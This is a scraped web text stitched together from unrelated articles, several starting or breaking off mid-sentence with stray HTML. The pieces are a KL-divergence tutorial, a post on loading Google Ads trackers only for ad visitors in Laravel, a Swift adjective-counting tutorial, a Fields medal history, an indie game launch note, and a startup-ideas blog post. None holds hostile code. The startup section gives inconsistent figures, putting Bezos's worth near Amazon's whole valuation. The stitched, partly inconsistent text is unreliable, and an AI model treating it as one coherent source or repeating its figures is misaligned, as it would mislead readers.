href="https://www.countbayesie.com/blog/2015/3/17/interrogating-probability-distributions">Binomial distribution</a>. In this case all we need to do is estimate that probability parameter of the Binomial distribution. We know that if we have \(n\) trials and a probabily is \(p\) then the expectation is just \(E[x] = n \cdot p\). In this case \(n = 10\), and the expectation is just the mean of our data, which we'll say is 5.7, so our best estimate of p is 0.57. That would give us a binomal distribution that looks like this:</p></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_14237"><p>Comparing each of our models with our original data we can see that neither one is the perfect match, but which one is better?</p></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_18631"><div><p>There are plenty of existing error metrics, but our primary concern is with minimizing the amount of information we have to send. Both of these models reduce our problem to two parameters, number teeth and a probability (though we really only need the number of teeth for the uniform distribution). The best test of which is better is to ask which distribution preserves the most information from our original data source. This is where Kullback-Leibler Divergence comes in.</p><h2>The entropy of our distribution</h2><p>KL Divergence has its origins in information theory. The primary goal of information theory is to quantify how much information is in data. The most important metric in information theory is called Entropy, typically denoted as \(H\). The definition of Entropy for a probability distribution is:</p><p>$$H = -\sum_{i=1}^{N} p(x_i) \cdot \text{log }p(x_i)$$</p><p>If we use \(log_2\) for our calculation we can interpret entropy as "the minimum number of bits it would take us to encode our information". &nbsp;In this case, the information would be each observation of teeth counts given our empirical distribution. Given the data that we have observed, our probability distribution has an entropy of 3.12 bits.&nbsp;The number of bits tells us the lower bound for how many bits we would need, on average, to encode the number of teeth we would observe in a single case.</p><p>What entropy doesn't tell us is the optimal encoding scheme to help us achieve this compression. Optimal encoding of information is a very interesting topic, but not necessary for understanding KL divergence. The key thing with Entropy is that, simply knowing the theoretical lower bound on the number of bits we need, we have a way to quantify exactly how much information is in our data. Now that we can quantify this, we want to quantify how much information is lost when we substitute our observed distribution for a parameterized approximation.</p><h2>Measuring information lost using Kullback-Leibler Divergence</h2><p>Kullback-Leibler Divergence is just a slight modification of our formula for entropy. Rather than just having our probability distribution \(p\) we add in our approximating distribution \(q\). Then we look at the difference of the log values for each:</p><p>$$D_{KL}(p||q) = \sum_{i=1}^{N} p(x_i)\cdot (\text{log }p(x_i) - \text{log }q(x_i))$$</p><p><br>Essentially, what we're looking at with the KL divergence is the <a href="https://www.countbayesie.com/blog/2015/3/19/expectation-and-variance-from-high-school-to-grad-school">expectation</a> of the log difference between the probability of data in the original distribution with the approximating distribution. Again, if we think in terms of \(log_2\) we can interpret this as "how many bits of information we expect to lose". We could rewrite our formula in terms of expectation:</p><p>$$D_{KL}(p||q) = E[\text{log } p(x) - \text{log } q(x)]$$</p><p>The more common way to see KL divergence written is as follows:</p><p>$$D_{KL}(p||q) = \sum_{i=1}^{N} p(x_i)\cdot log\frac{p(x_i)}{q(x_i)}$$</p><p>since \(\text{log }a - \text{log b} = \text{log }\frac{a}{b}\).</p><p>With KL divergence we can calculate exactly how much information is lost when we approximate one distribution with another. Let's go back to our data and see what the results look like.</p><h2>Comparing our approximating distributions</h2><p>Now we can go ahead and calculate the KL divergence for our two approximating distributions. For the uniform distribution we find:</p><p>$$D_{kl}(\text{Observed } || \text{ Uniform}) = 0.338$$</p><p>And for our Binomial approximation:</p><p>$$D_{kl}(\text{Observed } || \text{ Binomial}) = 0.477$$</p><p>As we can see the <em>information lost</em> by using the Binomial approximation is greater than using the uniform approximation. If we have to choose one to represent our observations, we're better off sticking with the Uniform approximation.</p><h3>Divergence <em>not</em> distance</h3><p>It may be tempting to think of KL Divergence as a distance metric, however we cannot use KL Divergence to measure the <em>distance</em> between two distributions. The reason for this is that KL Divergence is <em>not symmetric</em>. For example we if used our observed data as way of approximating the Binomial distribution we get a very different result:</p><p>$$D_{kl}( \text{Binomial} || \text{Observed}) = 0.330$$<br>Intuitively this makes sense as in each of these cases we're doing a very different form of approximation.</p><h2>Optimizing using KL Divergence</h2><p>When we chose our value for the Binomial distribution we chose our parameter for the probability by using the expected value that matched our data. But since we're optimizing for minimizing information loss, it's possible this wasn't really the best way choose the parameter.&nbsp;We can double check our work by looking at the way KL Divergence changes as we change our values for this parameter. Here's a chart of how those values change together:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_28671"><div><p><br>As you can see, our estimate for the binomial distribution (marked by the dot) was the best estimate to minimize KL divergence.</p><p>Suppose we wanted to create an ad hoc distribution to model our data.&nbsp;We'll split the data in two parts. The probabilities for 0-5 teeth and the probabilities for 6-10 teeth. Then we'll use a single parameter to specify what percentage of the total probability distribution falls on the right side of the distribution. For example if we choose 1 for our parameter then 6-10 will each have a probability of 0.2 and everything in the 0-5 group would have a probability of 0. So basically:</p><p>$$[6,11] = \frac{p}{5}; [0,5] = \frac{1-p}{6}$$</p><p>Note: Because \(log\) is undefined for 0, the only time we can allow probabilities that are zero is when \(p(x_i) = 0\) implies \(q(x_i) = 0\).</p><p>How could we find the optimal parameter for this strange model we put together? All we need to do is minimize KL divergence the same way we did before:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_34372"><p><br>We find that the minimum value for KL Divergence is 0.338 found when \(p=0.47\). That value for the minimum KL divergence should look pretty familiar: it's nearly identical to the value we got from our uniform distribution! When we plot out the values of our ad hoc distribution with the ideal value for \(p\) we find that it is nearly uniform:</p></div><div data-block-type="2" id="block-yui_3_17_2_3_1494396184641_37635"><div><p>Since we don't save any information using our ad hoc distribution we'd be better off using a more familiar and simpler model.&nbsp;</p><p>The key point here is that we can use KL Divergence as an objective function to find the optimal value for any approximating distribution we can come up with. While this is example is only optimizing a single parameter, we can easily imagine extending this approach to high dimensional models with many parameters.</p><h2>Variational Autoencoders and Variational Bayesian methods</h2><p>If you are familiar with neural networks, you may have guessed where we were headed after the last section. Neural networks, in the most general sense, are function approximators. This means that you can use a neural network to learn a wide range of complex functions. The key to getting neural networks to learn is to use an objective function that can inform the network how well it's doing. You train neural networks by minimizing the loss of the objective function.&nbsp;</p><p>As we've seen, we can use KL divergence to minimize how much information loss we have when approximating a distribution. Combining KL divergence with neural networks allows us to learn very complex approximating distribution for our data. A common approach to this is called a "Variational Autoencoder" which learns the best way to approximate the information in a data set. Here is <a href="https://arxiv.org/abs/1606.05908">a great tutorial </a>that dives into the details of building variational autoencoders.</p><p>Even more general is the area of Variational Bayesian Methods. In other posts we've seen how powerful <a href="https://www.countbayesie.com/blog/2015/3/3/6-amazing-trick-with-monte-carlo-simulations">Monte Carlo simulations</a> can be to solve a range of probability problems. While Monte Carlo simulations can help solve many intractable integrals needed for Bayesian inference, even these methods can be very computationally expensive. Variational Bayesian method, including Variational Autoencoders, use KL divergence to generate optimal approximating distributions, allowing for much more efficient inference for very difficult integrals.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>I believe in people's right to privacy. I believe we shouldn't be needlessly tracked all over the web by big tech companies. At the same time, I am trying to run an online business. This means that if I want to be successful, I would have to at least partially play ball with the tech giants.</p><h2 id="the-challenge">The challenge </h2><p>My latest challenge on this front was search ad conversion tracking. After trying out a few different acquisition channels for my product, <a href="https://thankbox.co/">Thankbox</a>, I noticed that search ads work really well. I set up both Microsoft Bing and Google Adwords and started seeing a steady stream of new users. For this article, I'll focus on Adwords.</p><p>Adwords has a conversion tracking feature which lets you track which keywords "convert" best. In my case, I wanted to track which keywords resulted in a user actually signing up and creating a Thankbox. </p><p>In order to do that, I'd have to add Google's trackers to my website. This is some JS code that they encourage you to add to the <code>&lt;head&gt;</code> tag of <strong>every page in your website.</strong> Here is an extract from Google's instructions, which uses their Google Tag Manager for this.</p><figure><img src="https://www.valcanbuild.tech/content/images/2020/11/CleanShot-2020-11-02-at-15.53.42@2x.png" alt="" srcset="https://www.valcanbuild.tech/content/images/size/w600/2020/11/CleanShot-2020-11-02-at-15.53.42@2x.png 600w, https://www.valcanbuild.tech/content/images/size/w1000/2020/11/CleanShot-2020-11-02-at-15.53.42@2x.png 1000w, https://www.valcanbuild.tech/content/images/2020/11/CleanShot-2020-11-02-at-15.53.42@2x.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>I cringed when I read that. I take pride in not having polluted my website with trackers but now I was fighting with what seems to be good business sense - knowing where your customers come from.</p><h2 id="do-they-really-need-to-track-every-page">Do they really need to track every page?</h2><p>After a bit of thought I realised that there's no way, from a functional standpoint, for Google to need this script installed on every page. Surely for tracking a conversion you just need it on the pages involved in the steps. For me, that was actually just two pages for the four step process.</p><p><strong>Adwords click -&gt; Landing page -&gt; Create Thankbox page -&gt; Create a Thankbox finished (conversion)</strong></p><p>It seemed to me that I only needed to install this on my Landing page and the "Create Thankbox" page. </p><p>That's already a win but not a big one - my landing page is (naturally) my most visited page so <strong>I'd still be exposing all visitors to a script</strong> <strong>intended to be used only for people coming off search ads</strong>.</p><p>💡 That's when a lightbulb turned on.</p><h2 id="do-they-really-need-to-track-every-user">Do they really need to track every user?</h2><p>No - they don't! I certainly didn't want to. </p><p>I realized that the most responsible thing to do in this case would be to <strong>only track users who arrive from Adwords</strong>. Only those people would get the script included. </p><h2 id="knowing-who-to-track-using-refs">Knowing who to track - using refs</h2><p>In order to only load the script conditionally I had to be able to discern the users that came from Adwords from everyone else. The easiest way to do that was to just add a <code>?ref</code> parameter to the ad, since Google are totally OK with you doing that. <code>utm_source</code> would have also worked here. </p><figure><img src="https://www.valcanbuild.tech/content/images/2020/11/image-1.png" alt="" srcset="https://www.valcanbuild.tech/content/images/size/w600/2020/11/image-1.png 600w, https://www.valcanbuild.tech/content/images/2020/11/image-1.png 912w" sizes="(min-width: 720px) 720px"></figure><p>Thankbox runs on Laravel and using the Laravel blade components (server side rendering) it was really easy for me to conditonally add the tracker only if the ref contained the word "Google". I include this in both my landing and Create Thankbox pages. </p><pre><code>&lt;head&gt;
    @if(str_contains(request()-&gt;query('ref'), 'Google'))
        @include('partials.scripts.adwords-tracker')
		@include('partials.scripts.cookie-consent')
    @endif
&lt;/head&gt;</code></pre><p>Then I had to make sure to pass this ref to my Create Thankbox page. I do that by modifying the <code>href</code> link of the Create <code>&lt;a&gt;</code> tag &nbsp;if there is a ref in the request.</p><pre><code>@php
$create_link = '/app/thankbox/create';
$ref = request()-&gt;query('ref');
if ($ref) {
    $create_link .= '?ref=' . $ref;
}
@endphp

&lt;a href="{{ $create_link }}"&gt;Create a Thankbox&lt;/a&gt;</code></pre><p>Here is an image that shows what happens:</p><figure><img src="https://www.valcanbuild.tech/content/images/2020/11/TrackMeSteps-2.png" alt="" srcset="https://www.valcanbuild.tech/content/images/size/w600/2020/11/TrackMeSteps-2.png 600w, https://www.valcanbuild.tech/content/images/size/w1000/2020/11/TrackMeSteps-2.png 1000w, https://www.valcanbuild.tech/content/images/size/w1600/2020/11/TrackMeSteps-2.png 1600w, https://www.valcanbuild.tech/content/images/size/w2400/2020/11/TrackMeSteps-2.png 2400w" sizes="(min-width: 1200px) 1200px"></figure><p>The final step was to actually attribute the Thankbox creation. That was as simple as just checking if <code>gtag</code> (Google Tag Manager) exists and calling it once the form is submitted.</p><pre><code>if (typeof gtag === 'function') {
    gtag('event', 'conversion', {})
}</code></pre><h2 id="privacy-minded">Privacy minded</h2><p>That's it! With some extra thought and a little bit of extra effort I was able to keep tracker scripts from taking over my whole website. I've contained them just to the places I need them.</p><p>As an added bonus to this work it means that I only have to show a cookie notice to those tracked users, not everyone. This is because my normal landing page has no trackers that require one to be shown. When it comes to website analytics I didn't go with the web standard Google Analytics. Instead, I went with <a href="https://usefathom.com/ref/WRPOFE">Fathom Analytics</a> - a privacy focused alternative. It is GDPR-friendly and doesn't require a cookie prompt.</p><p>For easy cookie &amp; privacy notice management I ended up using <a href="http://iubenda.refr.cc/N3BCKCN">Iubenda</a>, which was recommended by a fellow founder.</p>

                    <h6>
                        By Andres Acevedo, Published 2020-11-03
                    </h6>
                </p><div itemprop="articleBody"><p>While it is easy for a good reader to identify poorly written emails, articles, or even fiction works, paradoxically writing is one of those activities we all think we do just “good enough”.
But even if you are conscious about improving your writing abilities, sometimes you don’t know where or how to start.</p>
<p>You could make a very thorough revision of a specific email or an article you are writing and think that is enough.
While it is certainly helpful to double-check a particular text, you are analyzing just a piece, so this process does not really give you too much information about your overall writing style.
What would be very helpful is to take a lot of pages written by some author (you for example), and in a detailed manner, underline what are the most used structures, and lexical units.</p>
<p>This could be a tiresome process because we usually read to get new information, not to identify hidden features of known texts.
This is where the recent advances in artificial intelligence, and particularly in Natural Language Processing can come in handy.</p>
<p>There are multiple ways you can apply NLP for analyzing texts, in this way you can get new insights about known books or authors, or if you apply it to your own texts, you can use the collected information to improve your writing style.</p>
<p>In this introductory article to Machine Learning, we will code a macOS application that will identify the most used adjectives of a certain text.
Using a limited vocabulary is one of the things that can result in a tiresome reading experience, so if we input a good sample of text, this could give us insights about the style of the text.</p>

<p><img src="https://www.turtle-techies.com/analyzing-writing-styles-with-ai-in-swift/image01.png" alt="Starting a new macOS app"></p><p>I have used the storyboard to create a starter project with the basic UI elements we will use.
You can save some time downloading it 

<a href="https://github.com/mran3/MLAdjectives" target="_blank">here</a>.</p>
<p>If you prefer, you can also create the UI yourself using another method (like doing it programmatically or using SwiftUI).
To continue with the tutorial, you should have a user interface similar to the following one:</p>

</p>
<p>You might think working with Artificial Intelligence is super hard.
But that is not always the case. Apple provides us with some really powerful pre-trained Machine Learning models that we just need to use without needing to train them or do any complex configuration.</p>
<h2 id="introducing-an-intelligent-tagger">Introducing an Intelligent Tagger <a href="#introducing-an-intelligent-tagger"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>Let’s code what our analyzer will do once the Analyze button is clicked and you will see for yourself how simple it can be to use Machine Learning inside our Swift applications.</p>
<p>First, we need to create a NSLinguisticTagger object, it is a class that “provides a uniform interface to a variety of natural language processing functionality with support for many different languages and scripts.”</p>
<p>We can create a new NSLinguisticTagger with the following line of code:</p>
<div><pre><code data-lang="swift">
<span>let</span> tagger = NSLinguisticTagger(tagSchemes: [.lexicalClass], options: <span>0</span>)

</code></pre></div><p>It is important to pay attention to the tagSchemes parameter.
This defines the kind of tags that our tagger will use, as we are interested in identifying the lexical parts of our text (the adjectives in particular), the lexicalClass scheme is enough.</p>
<p>Other possible values are:</p>
<ul>
<li><code>.language</code> for identifying in which language a text is written.</li>
<li><code>.lemma</code> to get the stem form of a word, for example, the stem form of “Identifying” is “identify”, stem form of “your” is “you”, of “sentences” is “sentence” and so on…</li>
<li><code>.nameType</code> to identify if the word is a Personal name, the name of an organization, or the name of a Place.</li>
<li><code>.script</code> to identify the script (writing system) of the text according to ISO 15924. For example Latin or Simplified Chinese.</li>
</ul>
<p>Let’s continue configuring our tagger:</p>
<div><pre><code data-lang="swift">
tagger.string = text
<span>let</span> range = NSRange(location: <span>0</span>, length: text.utf16.count)
<span>let</span> options: NSLinguisticTagger.Options = [.omitPunctuation, .omitWhitespace]

</code></pre></div><p>Here we just create a range comprising the whole text and set up our tagger to omit punctuation and whitespace.</p>
<p>Now we will instruct our tagger to do its job and enumerate each one of the tag it identifies with the following piece of code:</p>
<div><pre><code data-lang="swift">
tagger.enumerateTags(<span>in</span>: range, unit: .word, scheme: .lemma, options: options) { tag, tokenRange, <span>_</span> <span>in</span>
         <span>if</span> <span>let</span> tag = tag {
             <span>let</span> word = (text <span>as</span> NSString).substring(with: tokenRange)
              print(<span>"</span><span>\(</span>word<span>)</span><span>: </span><span>\(</span>tag<span>)</span><span>"</span>)
         }
}

</code></pre></div><h2 id="presenting-our-results-in-a-table-view">Presenting our results in a Table View <a href="#presenting-our-results-in-a-table-view"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>To show this results nicely ordered in the TableView I defined a simple struct representing a word row and declared an array of it:</p>
<div><pre><code data-lang="swift">
<span>struct</span> <span>WordRow</span> {
    <span>var</span> adjective: String
    <span>var</span> count: Int = <span>1</span>
}
<span>class</span> <span>ViewController</span>: NSViewController, NSTableViewDelegate {
    <span>@IBOutlet</span> <span>var</span> textView: NSTextView!
    <span>@IBOutlet</span> <span>weak</span> <span>var</span> tableView: NSTableView!
    <span>var</span> arRows: [WordRow] = [WordRow]()
...


</code></pre></div><p>Now, inside the closure of enumerateTags, let’s use only the adjectives, and order them by most repeated:</p>

</p>
<p>It seems Charles Dickens liked to write about little free things. Don’t you think?</p>
<p>Our AI-powered app is so smart that it does not work only with English, but with tenths of languages without changing anything.
Imagine how complex would have been to code an algorithm that identifies adjectives in different languages by traditional means.
Just have in mind that machine learning is not perfect, the computer has learned to identify certain patterns and structures instead of having the complete set of words and combinations for all languages (which would be nearly impossible).
So from time to time, its results will not be perfect, in the same way that our own biological intelligence induces us to make mistakes from time to time.</p>

</section><p>What comes to mind when you think of the most prestigious awards in mathematics? Chances are, it’s either the Abel prize or the Fields medal. I think most of us have heard about Abel at one point or another, but I became increasingly curious about Fields. Who is behind the so-called Nobel prize of mathematics?</p>
<div id="attachment_15596"><p><a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/fields.jpg"><img aria-describedby="caption-attachment-15596" loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/fields.jpg?resize=227%2C300" alt="" width="227" height="300" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/fields.jpg?resize=227%2C300 227w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/fields.jpg?resize=1%2C1 1w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/fields.jpg?w=302 302w" sizes="(max-width: 227px) 100vw, 227px" data-recalc-dims="1"></a></p><p id="caption-attachment-15596">John Charles Fields</p></div>
<p>John Charles Fields was born in 1863, in Ontario, Canada and studied at the University of Toronto before moving to the United States in 1887 to study for a PhD at Johns Hopkins University in Baltimore. Fields was involved in several mathematical societies—the Royal Society of Canada and the Royal Canadian Institute among others—and he spent most of his life lecturing at the University of Toronto. Though a great mathematician, he excelled at organising mathematical events and promoting research.</p>
<p>One of his greatest achievements was working with the International Mathematical Union to hold the 1924 International Congress of Mathematicians (ICM) in Toronto. This was only the second congress held by the union after the First World War. During the first congress, Germany, Austria–Hungary, Bulgaria and Turkey were excluded from the union and many were worried this might escalate. But Fields was determined to make the 1924 congress work. He spent months in Europe fundraising tirelessly. Some say personal acquaintances with rulers of Europe aided his efforts—attendance of a dinner with the king of Sweden and a later meeting with Mussolini in Bologna certainly support this claim—but no direct sources remain. After organising the conference, with money to spare, he paid for European mathematicians’ travel costs across the Atlantic. And this is where the idea of the Fields medal was born.</p>
<h2>The proposal</h2>
<blockquote><p>It is proposed to found two gold medals to be awarded at successive International Mathematical Congress for outstanding achievements in mathematics […]</p></blockquote>
<p>The idea of the award was first presented on 24 February 1931. Because of Fields’ talent for acquiring funds, the medals were to be funded by the remaining finances from the 1924 ICM. Fields wrote, “It is proposed to found two gold medals to be awarded at successive International Mathematical Congress for outstanding achievements in mathematics […]” The awards would be open to the whole world and would be made by an international committee.”</p>
<p>He proposed the medals would be handed out at every congress for work already done, but also to encourage further achievement, starting with the next congress in 1936. Unfortunately, Fields’ health started to decline in 1932. Just days before his death, he noted in his will to leave an additional 47,000 Canadian dollars to fund the medal. As he had intended, the very first medals were awarded in the 1936 ICM in Oslo, Norway.</p>
<p>Today, Fields medals are awarded every four years to between two and four brilliant mathematicians under the age of 40 with a prize of C$15,000. The age limit was not directly due to Fields himself; it was added in 1966 to promote diversity, although recently this choice has been criticised as there is anecdotal evidence suggesting female mathematicians fare better later in their careers.</p>
<p>The medal itself was designed by Robert Tait McKenzie and features Fields’ monogram alongside a profile of Archimedes and the date of the medal’s founding, incorrectly written in Roman numerals: MCNXXXIII (1933). The reverse features an illustration of one of Archimedes’ most famous achievements: deducing the surface areas and volumes of the cylinder and the sphere which can be inscribed within the cylinder. Each face of the medal bears a Latin phrase:</p>

<p>The date of the prize being awarded and the recipient’s name is engraved on the rim of the medal.</p>
<p>In 1936, Jesse Douglas and Lars Ahlfors were the first to receive Fields medals. What was so special about these two mathematicians, that they stood out from across the globe to become the first winners of the (arguably) highest honour in mathematics?</p>
<h2>Jesse Douglas</h2>
<p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/jesse.jpg"><img loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/jesse.jpg?resize=247%2C300" alt="" width="247" height="300" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/jesse.jpg?resize=247%2C300 247w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/jesse.jpg?resize=1%2C1 1w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/jesse.jpg?w=268 268w" sizes="(max-width: 247px) 100vw, 247px" data-recalc-dims="1"></a>Jesse Douglas’s love for mathematics started in high school. While studying at the City College of New York, he became the youngest recipient of the college’s Belden medal for excellence in mathematics in his first year. After his undergraduate degree, Douglas began his doctoral study at Columbia University under the supervision of Edward Kasner, who introduced Douglas to the problem that became his most noteworthy achievement—Plateau’s problem.</p>
<p>Plateau’s problem (also known as the soap bubble problem) is about showing the existence of a minimal surface for a given boundary, and possibly with other constraints. This has a fascinating physical application in the form of soap films. A frame filled with a thin soap bubble, due to the action of surface tension, will always take the shape of minimum surface area: a so-called <em>minimal surface</em>. In 1931, Douglas discovered and proved a general solution, for which he came to win the Fields medal (although this was also done independently by Tibor Radó: Radó also created the <em>busy beaver</em> family of Turing machines, see <a href="http://chalkdustmagazine.com/uncategorized/will-this-article-ever-end/" target="_blank" rel="noopener noreferrer"><em>Will this article ever end</em></a>). Before this contribution, only some special cases had been proven by such mathematicians as Schwarz, Weierstrass, and Riemann.</p>
<p>Around the same time, Douglas was working at the Massachusetts Institute of Technology as an assistant professor, later to be promoted to an associate professor. He continued to work on Plateau’s problem even after solving it, focusing on further generalisations of the problem. He published 11 papers between 1939 and 1940 on these generalisations.</p>
<p>After working on Plateau’s problem for many years, Douglas diverted his attention to group theory, making significant contributions to the field. He spent the last 10 years of his life as a professor, back at the City College of New York.</p>
<h2>Lars Ahlfors</h2>
<p><a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/lars.jpg"><img loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/lars.jpg?resize=300%2C258" alt="" width="300" height="258" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/lars.jpg?resize=300%2C258 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/lars.jpg?resize=1%2C1 1w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/lars.jpg?w=335 335w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1"></a>Lars Ahlfors was a Finnish mathematician born in April 1907. As a child, he already loved maths. This love only grew although most of his life was spent in the midst of war.</p>
<p>Ahlfors started his university studies at the University of Helsinki and was taught by two of the best Finnish mathematicians at the time: Ernst Lindelöf and Rolf Nevanlinna. After this, he followed Nevanlinna to Zürich and discovered mathematics can be taught in a different way. Lars came to understand “that [he] was supposed to do mathematics, not just learn it”. During his time in Zürich, Ahlfors encountered Denjoy’s conjecture (now known as the Denjoy–Carleman–Ahlfors theorem) which he proved in 1929. Loosely, the theorem determines the number of values an entire function (a function that is differentiable everywhere in the complex plane) can take at infinity. This is what gave Ahlfors international recognition, though he himself always credits the significant help of Nevanlinna and Pólya as the main influences that lead to his proof. Though impressive, this was not what earned Ahlfors his Fields medal. That award was specifically credited to a single paper. This paper shed some light on Nevanlinna’s theory of meromorphic functions and quasiconformal mappings (more stuff to do with complex functions). Currently this paper is recognised as one of the starting points for essentially a new branch of analysis called metric topology.</p>
<p>Having already gone through the First World War as a child, Ahlfors was just about to go through the next challenge—the Second World War. But, surprisingly, his research benefited. He was able to devote himself to his work completely, even though libraries had closed due to the lack of students. In 1944, Lars was offered a position in Zürich, opportune timing since the Soviet Union was attacking Finland and Ahlfors’s own health was poor. So he, his wife, and two young children planned to flee to Switzerland, via Stockholm, the UK and then Paris.</p>
<p>Times were tough, and Ahlfors was only able to take 10 crowns with him. So what did he do on arrival in Stockholm? He smuggled his Fields medal across the border and sold it in a pawn shop! He later reflected, “I’m sure it is the only Fields medal that has been in a pawn shop. As soon as I got a little money some people in Sweden helped me retrieve it.” What a relief! Imagine if someone had actually bought it!</p>
<p>Luckily, the family made it to Switzerland safely. Slowly, though, Ahlfors began to feel that his invitation had been not an honour, but simply an attempt to fill a position they couldn’t find anyone else for. So when an offer came in from Harvard, Ahlfors gladly accepted it and remained there for more than 30 years until his retirement.</p>
<p>Since Douglas and Ahlfors first won in 1936, 58 other mathematicians have been awarded the medal, including the only person to decline the award—Grigori Perelman—and the first and so far only woman to receive the award—Maryam Mirzakhani. The next ICM is due to be held in 2022 in St Petersburg, Russia, and the story of the Fields medal and its winners will continue.</p>

On Friday I followed through on that youthful dream and shipped Asterogue, yay!</p>
<p>This game won’t sell. I have been around the indie games scene long enough to know its a crap-shoot. To make a successful indie game you have to execute at peak performance, do everything right, and then you still roll the dice on success. I’ve seen stone cold geniuses build glorious works of art and watch them get zero downloads. A single tear rolls down their cheek one week after launch and tiny pixellated violins play a chiptune version of Mozart’s Requiem.</p>
<p>My game won’t sell and that’s ok. I am at peace with it after all of these years of game jams and side projects. It is the way of things. I’m just happy to have had the chance to fulfill this dream.</p>
<p>I had so much fun making Asterogue. I’ve never worked harder on a side project. I publically committed to an October 30th release, and I’ve done it. I built the thing I dreamed of making since I was a kid, and I am simply grateful to the universe that this opportunity was within my reach.</p>
<p>I want to thank the people who took a chance and bought the game. It’s amazing to me that our tiny club of people who like this kind of game has more than one member. You guys rock!</p>
<p>I also want to thank from the bottom of my heart the people who tested the game and gave me feedback. It’s an honor when somebody is willing to sacrifice their time to try out something you built, and I really appreciate it. It’s your feedback that made this the best possible game I could make in the time allocated. Thank you.</p>

<p><span>However, there is always the question of how to create good ideas, sell them and negotiate the highest value for them. Eric Stromberg (head of Google Play) has made up the Startup Idea Matrix that, as he claims, “outlines various consumer markets as well as tactics a company can take to bring a unique product to the market”.</span></p>

<p><span>Anyone can look through it and get some inspiration and, what is more important, ideas for the startup not only on the Internet but also in the offline business.</span></p>
<p><span>Ideas are given in the columns of the table, and the consumer markets are shown in the rows with the well-known examples in between.</span></p>
<p><a name="ideas"></a>The author of the matrix notes that it is very prudent to be patient in finding your business idea, market, or opportunity.</p>
<h2>Ideas are more valuable than money</h2>
<p><span>As you can see, in nowadays reality, simple ideas are the basis for the success of many companies. For example, Instagram has created a photo service only for smartphones. Nowadays 1 billion people use Instagram every month. </span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/insta_2020.jpg" alt="" width="427" height="619"></p>
<p><span>The founder of Evernote Stepan Pachikov has decided to transfer an offline activity into an online one by creating a web service and software set for making and storing notes. In just 5 years, there were 65 million Evernote users. Or the most spread tactic – making a paid product free – has helped Udacity, Coursera and EdX to make a revolution in education by providing free online courses for everyone. That’s not the whole list! And anyone can take a cue from these companies and fill the empty cells!</span></p>
<blockquote><p><i><span>“Think of this less as a map and more as a starting point for creativity.” – Eric Stromberg</span></i></p></blockquote>
<p><span>At the beginning of the article, we gave an example showing that certain ideas are more valuable than money. &nbsp;Guess why? Well, e</span><span>veryone lo</span><span>ves a good rags-to-riches story! A brilliant yet simple idea is behind each and every such story! Need proof?</span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/1200px-Facebook_New_Logo_2015.svg_-1.png" alt="" width="1200" height="451"></p>
<p><span>The very same Zuckerberg being a student came up with the idea of a “hot or not” type of website called Facemash. It was the first step in his journey to the well-known Facebook. Zuckerberg is now worth over $35 billion.</span></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2017/06/google-new-logo-2015-1.jpg" alt="" width="1200" height="700"></p>
<p><span>Students are very inventive! Just like Facebook, Google was also created during the college years. Larry Page and Sergey Brin came up with the idea of a unique search engine. Now Google has more than $66 billion in sales and continues to grow by developing the other businesses. Page and Brin are now each worth almost $30 billion.<img src="https://s-pro.io/blog/wp-content/uploads/2017/06/amazon_logo_RGB-1.jpg" alt="" width="1250" height="458"></span></p>
<p><span>But don’t even think that only students can become billionaires. Jeff Bezos was working at a Wall Street firm before he realized that he wanted to launch his own online bookstore. Now Amazon sells everything you can think of. It’s worth about $200 billion with over $88 billion in annual sales. Bezos is now worth over $150 billion.</span><a name="blue"></a></p>

<a href="#review">Check-list: review your startup idea for validity</a></span></h3>
<h2>Blue Ocean strategy</h2>
<p><span>Need something else&nbsp;for inspiration? Well, there is a great book “Blue Ocean Strategy” by W. Chan Kim and Renée Mauborgne. You should definitely read it, it will be a great investment in yourself. The approach that is described in this book is very simple: to create something new all you need to do is just mix two spheres or two working ideas. You can do it endlessly.</span></p>
